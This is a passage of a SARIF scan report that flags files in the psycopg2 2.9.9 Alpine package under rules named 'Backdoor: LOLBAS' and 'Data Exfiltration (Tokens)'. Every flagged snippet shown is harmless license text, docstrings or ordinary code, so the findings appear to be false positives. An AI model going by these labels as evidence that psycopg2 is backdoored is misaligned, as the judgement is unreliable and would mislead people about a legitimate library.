                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/_range.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 42,
                  "endLine": 16,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/sql.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 22,
                  "endLine": 16,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/sql.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 42,
                  "endLine": 15,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/extensions.py"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 22,
                  "endLine": 25,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/extensions.py"
                },
                "region": {
                  "startLine": 24,
                  "startColumn": 42,
                  "endLine": 24,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/extensions.py"
                },
                "region": {
                  "startLine": 56,
                  "startColumn": 50,
                  "endLine": 56,
                  "endColumn": 58,
                  "snippet": {
                    "text": "    string_types, binary_types, new_type, new_array_type, register_type,\n    ISQLQuote, Notify, Diagnostics, Column, ConnectionInfo,\n    QueryCanceledError, TransactionRollbackError,\n    set_wait_callback, get_wait_callback, encrypt_password, )\n\n\n\"\"\"Isolation level values.\"\"\"\n",
                    "rendered": {
                      "text": "    string_types, binary_types, new_type, new_array_type, register_type,\n    ISQLQuote, Notify, Diagnostics, Column, ConnectionInfo,\n    QueryCanceledError, TransactionRollbackError,\n    set_wait_callback, get_wait_callback, encrypt_password, )\n\n\n\"\"\"Isolation level values.\"\"\"\n",
                      "markdown": "`    string_types, binary_types, new_type, new_array_type, register_type,\n    ISQLQuote, Notify, Diagnostics, Column, ConnectionInfo,\n    QueryCanceledError, TransactionRollbackError,\n    set_wait_callback, get_wait_callback, encrypt_password, )\n\n\n\"\"\"Isolation level values.\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/errors.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 22,
                  "endLine": 16,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/errors.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 42,
                  "endLine": 15,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/_json.py"
                },
                "region": {
                  "startLine": 146,
                  "startColumn": 57,
                  "endLine": 146,
                  "endColumn": 61,
                  "snippet": {
                    "text": "    Create and register :sql:`jsonb` typecasters for PostgreSQL 9.4 and following.\n\n    As in `register_default_json()`, the function allows to register a\n    customized *loads* function for the :sql:`jsonb` type at its known oid for\n    PostgreSQL 9.4 and following versions.  All the parameters have the same\n    meaning of `register_json()`.\n    \"\"\"\n",
                    "rendered": {
                      "text": "    Create and register :sql:`jsonb` typecasters for PostgreSQL 9.4 and following.\n\n    As in `register_default_json()`, the function allows to register a\n    customized *loads* function for the :sql:`jsonb` type at its known oid for\n    PostgreSQL 9.4 and following versions.  All the parameters have the same\n    meaning of `register_json()`.\n    \"\"\"\n",
                      "markdown": "`    Create and register :sql:`jsonb` typecasters for PostgreSQL 9.4 and following.\n\n    As in `register_default_json()`, the function allows to register a\n    customized *loads* function for the :sql:`jsonb` type at its known oid for\n    PostgreSQL 9.4 and following versions.  All the parameters have the same\n    meaning of `register_json()`.\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/_json.py"
                },
                "region": {
                  "startLine": 183,
                  "startColumn": 42,
                  "endLine": 183,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    # Store the transaction status of the connection to revert it after use\n    conn_status = conn.status\n\n    # column typarray not available before PG 8.3\n    typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n    # get the oid for the hstore\n",
                    "rendered": {
                      "text": "    # Store the transaction status of the connection to revert it after use\n    conn_status = conn.status\n\n    # column typarray not available before PG 8.3\n    typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n    # get the oid for the hstore\n",
                      "markdown": "`    # Store the transaction status of the connection to revert it after use\n    conn_status = conn.status\n\n    # column typarray not available before PG 8.3\n    typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n    # get the oid for the hstore\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/_json.py"
                },
                "region": {
                  "startLine": 93,
                  "startColumn": 55,
                  "endLine": 93,
                  "endColumn": 61,
                  "snippet": {
                    "text": "                  oid=None, array_oid=None, name='json'):\n    \"\"\"Create and register typecasters converting :sql:`json` type to Python objects.\n\n    :param conn_or_curs: a connection or cursor used to find the :sql:`json`\n        and :sql:`json[]` oids; the typecasters are registered in a scope\n        limited to this object, unless *globally* is set to `!True`. It can be\n        `!None` if the oids are provided\n",
                    "rendered": {
                      "text": "                  oid=None, array_oid=None, name='json'):\n    \"\"\"Create and register typecasters converting :sql:`json` type to Python objects.\n\n    :param conn_or_curs: a connection or cursor used to find the :sql:`json`\n        and :sql:`json[]` oids; the typecasters are registered in a scope\n        limited to this object, unless *globally* is set to `!True`. It can be\n        `!None` if the oids are provided\n",
                      "markdown": "`                  oid=None, array_oid=None, name='json'):\n    \"\"\"Create and register typecasters converting :sql:`json` type to Python objects.\n\n    :param conn_or_curs: a connection or cursor used to find the :sql:`json`\n        and :sql:`json[]` oids; the typecasters are registered in a scope\n        limited to this object, unless *globally* is set to `!True`. It can be\n        `!None` if the oids are provided\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/_json.py"
                },
                "region": {
                  "startLine": 20,
                  "startColumn": 22,
                  "endLine": 20,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/_json.py"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 42,
                  "endLine": 19,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/extras.py"
                },
                "region": {
                  "startLine": 1207,
                  "startColumn": 55,
                  "endLine": 1207,
                  "endColumn": 59,
                  "snippet": {
                    "text": "        *cur*\\.\\ `~cursor.executemany`\\ (\\ *sql*\\ , *argslist*\\ )\n\n    but has a different implementation: Psycopg will join the statements into\n    fewer multi-statement commands, each one containing at most *page_size*\n    statements, resulting in a reduced number of server roundtrips.\n\n    After the execution of the function the `cursor.rowcount` property will\n",
                    "rendered": {
                      "text": "        *cur*\\.\\ `~cursor.executemany`\\ (\\ *sql*\\ , *argslist*\\ )\n\n    but has a different implementation: Psycopg will join the statements into\n    fewer multi-statement commands, each one containing at most *page_size*\n    statements, resulting in a reduced number of server roundtrips.\n\n    After the execution of the function the `cursor.rowcount` property will\n",
                      "markdown": "`        *cur*\\.\\ `~cursor.executemany`\\ (\\ *sql*\\ , *argslist*\\ )\n\n    but has a different implementation: Psycopg will join the statements into\n    fewer multi-statement commands, each one containing at most *page_size*\n    statements, resulting in a reduced number of server roundtrips.\n\n    After the execution of the function the `cursor.rowcount` property will\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/extras.py"
                },
                "region": {
                  "startLine": 1178,
                  "startColumn": 18,
                  "endLine": 1178,
                  "endColumn": 22,
                  "snippet": {
                    "text": "def _paginate(seq, page_size):\n    \"\"\"Consume an iterable and return it in chunks.\n\n    Every chunk is at most `page_size`. Never return an empty chunk.\n    \"\"\"\n    page = []\n    it = iter(seq)\n",
                    "rendered": {
                      "text": "def _paginate(seq, page_size):\n    \"\"\"Consume an iterable and return it in chunks.\n\n    Every chunk is at most `page_size`. Never return an empty chunk.\n    \"\"\"\n    page = []\n    it = iter(seq)\n",
                      "markdown": "`def _paginate(seq, page_size):\n    \"\"\"Consume an iterable and return it in chunks.\n\n    Every chunk is at most `page_size`. Never return an empty chunk.\n    \"\"\"\n    page = []\n    it = iter(seq)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/extras.py"
                },
                "region": {
                  "startLine": 989,
                  "startColumn": 25,
                  "endLine": 989,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n    The class is usually created by the `register_composite()` function.\n    You may want to create and register manually instances of the class if\n    querying the database at registration time is not desirable (such as when\n    using an :ref:`asynchronous connections <async-support>`).\n\n    \"\"\"\n",
                    "rendered": {
                      "text": "\n    The class is usually created by the `register_composite()` function.\n    You may want to create and register manually instances of the class if\n    querying the database at registration time is not desirable (such as when\n    using an :ref:`asynchronous connections <async-support>`).\n\n    \"\"\"\n",
                      "markdown": "`\n    The class is usually created by the `register_composite()` function.\n    You may want to create and register manually instances of the class if\n    querying the database at registration time is not desirable (such as when\n    using an :ref:`asynchronous connections <async-support>`).\n\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/extras.py"
                },
                "region": {
                  "startLine": 868,
                  "startColumn": 47,
                  "endLine": 868,
                  "endColumn": 51,
                  "snippet": {
                    "text": "        for m in self._re_hstore.finditer(s):\n            if m is None or m.start() != start:\n                raise psycopg2.InterfaceError(\n                    f\"error parsing hstore pair at char {start}\")\n            k = _bsdec.sub(r'\\1', m.group(1))\n            v = m.group(2)\n            if v is not None:\n",
                    "rendered": {
                      "text": "        for m in self._re_hstore.finditer(s):\n            if m is None or m.start() != start:\n                raise psycopg2.InterfaceError(\n                    f\"error parsing hstore pair at char {start}\")\n            k = _bsdec.sub(r'\\1', m.group(1))\n            v = m.group(2)\n            if v is not None:\n",
                      "markdown": "`        for m in self._re_hstore.finditer(s):\n            if m is None or m.start() != start:\n                raise psycopg2.InterfaceError(\n                    f\"error parsing hstore pair at char {start}\")\n            k = _bsdec.sub(r'\\1', m.group(1))\n            v = m.group(2)\n            if v is not None:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/extras.py"
                },
                "region": {
                  "startLine": 1152,
                  "startColumn": 55,
                  "endLine": 1152,
                  "endColumn": 61,
                  "snippet": {
                    "text": "\n    :param name: the name of a PostgreSQL composite type, e.g. created using\n        the |CREATE TYPE|_ command\n    :param conn_or_curs: a connection or cursor used to find the type oid and\n        components; the typecaster is registered in a scope limited to this\n        object, unless *globally* is set to `!True`\n    :param globally: if `!False` (default) register the typecaster only on\n",
                    "rendered": {
                      "text": "\n    :param name: the name of a PostgreSQL composite type, e.g. created using\n        the |CREATE TYPE|_ command\n    :param conn_or_curs: a connection or cursor used to find the type oid and\n        components; the typecaster is registered in a scope limited to this\n        object, unless *globally* is set to `!True`\n    :param globally: if `!False` (default) register the typecaster only on\n",
                      "markdown": "`\n    :param name: the name of a PostgreSQL composite type, e.g. created using\n        the |CREATE TYPE|_ command\n    :param conn_or_curs: a connection or cursor used to find the type oid and\n        components; the typecaster is registered in a scope limited to this\n        object, unless *globally* is set to `!True`\n    :param globally: if `!False` (default) register the typecaster only on\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/extras.py"
                },
                "region": {
                  "startLine": 1082,
                  "startColumn": 46,
                  "endLine": 1082,
                  "endColumn": 50,
                  "snippet": {
                    "text": "            tname = name\n            schema = 'public'\n\n        # column typarray not available before PG 8.3\n        typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n        # get the type oid and attributes\n",
                    "rendered": {
                      "text": "            tname = name\n            schema = 'public'\n\n        # column typarray not available before PG 8.3\n        typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n        # get the type oid and attributes\n",
                      "markdown": "`            tname = name\n            schema = 'public'\n\n        # column typarray not available before PG 8.3\n        typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n        # get the type oid and attributes\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/extras.py"
                },
                "region": {
                  "startLine": 989,
                  "startColumn": 41,
                  "endLine": 989,
                  "endColumn": 47,
                  "snippet": {
                    "text": "\n    The class is usually created by the `register_composite()` function.\n    You may want to create and register manually instances of the class if\n    querying the database at registration time is not desirable (such as when\n    using an :ref:`asynchronous connections <async-support>`).\n\n    \"\"\"\n",
                    "rendered": {
                      "text": "\n    The class is usually created by the `register_composite()` function.\n    You may want to create and register manually instances of the class if\n    querying the database at registration time is not desirable (such as when\n    using an :ref:`asynchronous connections <async-support>`).\n\n    \"\"\"\n",
                      "markdown": "`\n    The class is usually created by the `register_composite()` function.\n    You may want to create and register manually instances of the class if\n    querying the database at registration time is not desirable (such as when\n    using an :ref:`asynchronous connections <async-support>`).\n\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/extras.py"
                },
                "region": {
                  "startLine": 952,
                  "startColumn": 33,
                  "endLine": 952,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    from the database have keys/values according to the *unicode* parameter.\n\n    The |hstore| contrib module must be already installed in the database\n    (executing the ``hstore.sql`` script in your ``contrib`` directory).\n    Raise `~psycopg2.ProgrammingError` if the type is not found.\n    \"\"\"\n    if oid is None:\n",
                    "rendered": {
                      "text": "    from the database have keys/values according to the *unicode* parameter.\n\n    The |hstore| contrib module must be already installed in the database\n    (executing the ``hstore.sql`` script in your ``contrib`` directory).\n    Raise `~psycopg2.ProgrammingError` if the type is not found.\n    \"\"\"\n    if oid is None:\n",
                      "markdown": "`    from the database have keys/values according to the *unicode* parameter.\n\n    The |hstore| contrib module must be already installed in the database\n    (executing the ``hstore.sql`` script in your ``contrib`` directory).\n    Raise `~psycopg2.ProgrammingError` if the type is not found.\n    \"\"\"\n    if oid is None:\n`"
                    }
                  },
